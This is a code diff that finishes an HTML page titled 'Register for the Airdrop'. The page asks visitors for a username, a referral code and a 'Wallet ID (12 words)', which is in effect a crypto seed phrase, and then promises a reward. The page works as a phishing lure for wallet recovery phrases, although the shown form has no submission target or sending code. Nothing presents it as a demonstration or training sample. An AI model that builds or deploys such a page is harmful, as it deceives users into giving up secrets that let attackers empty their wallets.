@@ -33,4 +33,59 @@
       margin-bottom: 15px;
       border: none;
       border-radius: 8px;
-      background:
+      background: #2c2c2c;
+      color: white;
+      font-size: 1em;
+    }
+    .wallet-input {
+      position: relative;
+    }
+    .toggle-eye {
+      position: absolute;
+      right: 10px;
+      top: 10px;
+      cursor: pointer;
+      color: #aaa;
+    }
+    input[type="submit"] {
+      background: #00ff99;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 8px;
+      color: black;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    input[type="submit"]:hover {
+      background: #00cc7a;
+    }
+    .message {
+      margin-top: 15px;
+      color: #00ff99;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Register for the Airdrop</h1>
+    <form>
+      <input type="text" placeholder="Username" required><br>
+      <div class="wallet-input">
+        <input type="password" id="wallet" placeholder="Wallet ID (12 words)" required>
+        <span class="toggle-eye" onclick="toggleWallet()">👁️</span>
+      </div>
+      <input type="text" placeholder="Referral Code"><br>
+      <input type="submit" value="Submit">
+    </form>
+    <div class="message">Thank you for registering! You'll receive your reward shortly.</div>
+  </div>
+
+  <script>
+    function toggleWallet() {
+      const walletField = document.getElementById("wallet");
+      walletField.type = walletField.type === "password" ? "text" : "password";
+    }
+  </script>
+</body>
+</html>
